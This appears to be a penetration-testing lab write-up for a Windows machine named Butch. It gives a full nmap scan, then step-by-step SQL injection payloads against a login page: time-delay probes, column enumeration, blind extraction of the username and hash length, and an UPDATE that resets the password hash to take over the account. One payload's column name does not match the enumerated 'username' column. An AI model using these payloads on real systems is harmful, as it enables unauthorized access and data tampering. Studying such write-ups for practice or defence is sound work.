#### Mind map

![Butch](https://user-images.githubusercontent.com/8998412/158007932-e61409eb-080e-48b8-b874-5d395cd7d659.png)

#### Enumeration

```
# Nmap 7.92 scan initiated Sun Feb 27 04:50:54 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.184.63/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.184.63/scans/xml/_full_tcp_nmap.xml 192.168.184.63
Nmap scan report for 192.168.184.63
Host is up, received user-set (0.30s latency).
Scanned at 2022-02-27 04:50:54 EST for 477s
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
25/tcp   open  smtp          syn-ack ttl 127 Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.49.184], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
450/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Butch
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=2/27%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=621B4B5B%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-27T09:58:14
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51234/tcp): CLEAN (Timeout)
|   Check 2 (port 45630/tcp): CLEAN (Timeout)
|   Check 3 (port 37138/udp): CLEAN (Timeout)
|   Check 4 (port 14133/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 1s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   295.76 ms 192.168.49.1
2   295.78 ms 192.168.184.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 04:58:51 2022 -- 1 IP address (1 host up) scanned in 477.73 seconds

```

I find the website that runs on port 450 has SQL injection vulnerability by using the waiting test.

```SQL
'; WAITFOR DELAY '00:00:10'; --
```
![image](1)

Attempts to log in using the usernames ```admin``` and ```administrator``` failed.

```SQL
' or 1=1; --
```

![image](2)

Because we can't use automatic exploitation tools in the exam, I start doing it manually.

First, we must know the name of the field.

```SQL
' HAVING 1=1; --
```

![image](3)

```SQL
' GROUP BY users.username HAVING 1=1; --
```

![image](4)

```SQL
' GROUP BY users.username, users.password_hash HAVING 1=1; --
```

![image](5)

Now we know that the data table users has two fields username and password_hash.

Check how many data are in the data table users. We can see from the query below that there is only one data.

```SQL
'; IF (SELECT COUNT(*) FROM users) = 1 WAITFOR DELAY '00:00:05'; --
```
Finding the username ```butch```.

```SQL
-- e.g. guess username (ASCII)
'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05'; --
'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05'; -- 
-- and so on
```

Guessing the length of the password by the command below.

```SQL
'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05'; -- 
-- and so on
```

Finally, we know that the password length is 64, so it may have been hashed. Because of the length of the password so I guessed that may use SHA-256 hash.

![image](6)

Now we update the password.

```SQL
-- 123456
'; UPDATE users SET password_hash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE user = 'butch'; -- 
-- check if update is successful
'; IF (SELECT password_hash FROM users WHERE user = 'butch') = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WAITFOR DELAY '00:00:05'; -- 
```

Login with username ```butch``` and password ```123456```.

![image](7)
